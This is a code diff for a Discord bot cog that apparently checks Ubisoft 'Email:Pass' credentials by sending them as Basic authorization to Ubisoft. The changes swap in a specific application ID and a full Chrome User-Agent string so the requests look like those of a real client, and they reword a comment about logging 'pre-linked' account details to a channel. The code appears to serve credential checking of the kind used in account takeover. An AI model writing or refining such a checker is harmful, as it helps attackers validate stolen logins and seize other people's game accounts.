@@ -6,8 +6,8 @@ import base64
 import utils
 import database as db
 
-# Ubisoft's generic fallback App ID (works without the specific game ID)
-UBI_APP_ID = "00000000-0000-0000-0000-000000000000"
+# Ubisoft App ID
+UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
 
 class Checker(commands.Cog):
     def __init__(self, bot):
@@ -38,7 +38,7 @@ class Checker(commands.Cog):
             "Content-Type": "application/json",
             "Ubi-AppId": UBI_APP_ID,
             "Authorization": f"Basic {b64_auth}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
 
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
@@ -70,7 +70,7 @@ class Checker(commands.Cog):
     async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
         await interaction.response.defer(ephemeral=True)
         
-        # Playwright is dead. We just log the details to your channel.
+        # Log to channel (manual check)
         embed = discord.Embed(
             color=0x5865F2, 
             title="🎮 Pre-Linked Check",
